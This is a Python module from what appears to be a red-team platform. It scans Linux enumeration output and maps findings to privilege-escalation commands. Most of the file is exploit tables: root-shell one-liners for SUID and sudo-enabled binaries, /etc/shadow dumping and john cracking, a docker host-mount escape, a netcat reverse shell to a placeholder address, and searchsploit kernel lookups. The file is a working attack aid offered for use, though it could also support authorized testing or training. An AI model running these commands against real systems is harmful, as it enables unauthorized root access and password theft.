# -*- coding: utf-8 -*-
"""
幕论红队协同平台 - Linux 提权分析模块
自包含：从枚举文本识别常见提权向量，返回可操作建议
"""

import re
from typing import Dict, List


# 已知可提权 SUID 二进制（GTFOBins 精选）
SUID_EXPLOITS = {
    'nmap':   'nmap --interactive 然后 !/bin/sh -p',
    'vim':    'vim -c ":!sh -p"',
    'vi':     'vi -c ":!sh -p"',
    'less':   'less /etc/passwd 然后 !/bin/sh -p',
    'more':   'more /etc/passwd 然后 !/bin/sh -p',
    'find':   'find . -exec /bin/sh -p \\; -quit',
    'bash':   'bash -p',
    'sh':     'sh -p',
    'python': 'python -c "import os;os.execl(\\"/bin/sh\\",\\"sh\\",\\"-p\\")"',
    'python3': 'python3 -c "import os;os.execl(\\"/bin/sh\\",\\"sh\\",\\"-p\\")"',
    'perl':   'perl -e \'exec "/bin/sh", "-p";\'',
    'awk':    'awk \'BEGIN {system("/bin/sh -p")}\'',
    'git':    'git -p help config 然后 !/bin/sh -p',
    'tar':    'tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh -p',
    'zip':    'zip /tmp/x.zip /etc/passwd -T -TT \'sh -p #\'',
    'cp':     'cp /tmp/passwd /etc/passwd（若 sudo/root 环境）',
    'man':    'man man 然后 !/bin/sh -p',
    'ed':     'ed 然后 !/bin/sh -p',
}

# sudo 可提权命令（GTFOBins sudo 向量）
SUDO_EXPLOITS = {
    'find':    'sudo find / -exec sh -p \\;',
    'vim':     'sudo vim -c "!sh"',
    'vi':      'sudo vi -c "!sh"',
    'less':    'sudo less /etc/shadow 然后 !sh',
    'more':    'sudo more /etc/shadow 然后 !sh',
    'cat':     'sudo cat /etc/shadow',
    'head':    'sudo head -1 /etc/shadow',
    'tail':    'sudo tail -1 /etc/shadow',
    'python':  'sudo python -c "import os;os.system(\'/bin/bash\')"',
    'python3': 'sudo python3 -c "import os;os.system(\'/bin/bash\')"',
    'perl':    'sudo perl -e "exec \'/bin/bash\'"',
    'awk':     'sudo awk "BEGIN {system(\'/bin/bash\')}"',
    'chmod':   'sudo chmod u+s /bin/bash 然后 bash -p',
    'env':     'sudo env /bin/sh',
    'tee':     'sudo tee /etc/sudoers.d/xxx',
    'nc':      'sudo nc -e /bin/sh <ip> <port>',
}


def analyze_text(text: str) -> List[Dict]:
    """分析枚举输出文本，识别提权向量"""
    findings = []
    text_l = text.lower()

    # 1. SUID 文件识别（要求行内含 rws 权限标记）
    suid_bins = set()
    for line in text.splitlines():
        if not re.search(r'\brws', line):
            continue
        for name in SUID_EXPLOITS:
            if re.search(r'/(?:usr/)?(?:s?bin/)?' + re.escape(name) + r'\b', line.lower()):
                suid_bins.add(name)
    # 兜底：纯 find 输出（-perm -4000 → 路径行）
    if not suid_bins:
        for m in re.finditer(r'(?:^|\s)(/[^\s]*?/([a-zA-Z0-9_.\-]+))\s*$', text, re.M):
            if m.group(2) in SUID_EXPLOITS and '/usr/share' not in m.group(1):
                suid_bins.add(m.group(2))

    for b in sorted(suid_bins):
        findings.append({
            'vector': 'SUID',
            'name': f'SUID {b}',
            'description': f'发现可提权 SUID 二进制: {b}',
            'commands': [SUID_EXPLOITS[b]],
            'severity': 'high',
            'references': [f'https://gtfobins.github.io/gtfobins/{b}/'],
        })

    # 2. sudo -l 输出中的可提权命令
    sudo_all = bool(re.search(r'\(ALL\s*(:\s*ALL)?\)\s*ALL', text)) or \
               bool(re.search(r'\(root\)\s+NOPASSWD:\s+ALL', text))
    if sudo_all:
        findings.append({
            'vector': 'SUDO',
            'name': 'Sudo (ALL) ALL',
            'description': '当前用户具有 (ALL) ALL sudo 权限，可直接提权',
            'commands': ['sudo su', 'sudo -s', 'sudo /bin/bash'],
            'severity': 'high',
            'references': ['https://gtfobins.github.io/gtfobins/sudo/'],
        })

    # 匹配 NOPASSWD 后面的命令列表
    nopasswd = re.search(r'NOPASSWD:\s*(.*)', text)
    if nopasswd:
        cmds = re.findall(r'(?:/usr/)?(?:s?bin/)?([a-z0-9_.\-]+)', nopasswd.group(1))
        for cmd in cmds:
            if cmd in SUDO_EXPLOITS:
                findings.append({
                    'vector': 'SUDO',
                    'name': f'sudo {cmd}',
                    'description': f'sudo 可免密执行 {cmd}，可提权',
                    'commands': [SUDO_EXPLOITS[cmd]],
                    'severity': 'high',
                    'references': [f'https://gtfobins.github.io/gtfobins/{cmd}/'],
                })

    # 3. 可写 /etc/shadow 或 /etc/passwd
    if re.search(r'/etc/shadow\s+.*-rw-', text) or 'shadow' in text_l and 'write' in text_l:
        findings.append({
            'vector': 'PASSWORD',
            'name': '/etc/shadow 可写/可读',
            'description': 'shadow 文件可读写，可改密码或离线破解',
            'commands': ['unshadow /etc/passwd /etc/shadow > /tmp/h.txt',
                         'john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/h.txt'],
            'severity': 'high',
            'references': ['https://book.hacktricks.wiki/linux-hardening/privilege-escalation/index.html'],
        })

    # 4. Docker 组
    if re.search(r'^docker\b', text, re.M) or 'in group docker' in text_l:
        findings.append({
            'vector': 'DOCKER',
            'name': 'Docker 组',
            'description': '用户在 docker 组，可挂载宿主根目录',
            'commands': ['docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh'],
            'severity': 'high',
            'references': ['https://gtfobins.github.io/gtfobins/docker/'],
        })

    # 5. 内核版本提示（若有明确版本）
    kernel = re.search(r'Linux\s+[\w@.:\-]+\s+([\d.]+)', text)
    if kernel:
        ver = kernel.group(1)
        findings.append({
            'vector': 'KERNEL',
            'name': f'内核 {ver}',
            'description': f'系统内核 {ver}，可查 exploit-db 对应内核提权（建议先尝试常规向量）',
            'commands': [f'# 在攻击机: searchsploit linux kernel {ver} 提权'],
            'severity': 'medium',
            'references': ['https://www.exploit-db.com/'],
        })

    # 去重（同向量同命令）
    seen = set()
    uniq = []
    for f in findings:
        key = (f['vector'], f['commands'][0])
        if key not in seen:
            seen.add(key)
            uniq.append(f)
    return uniq
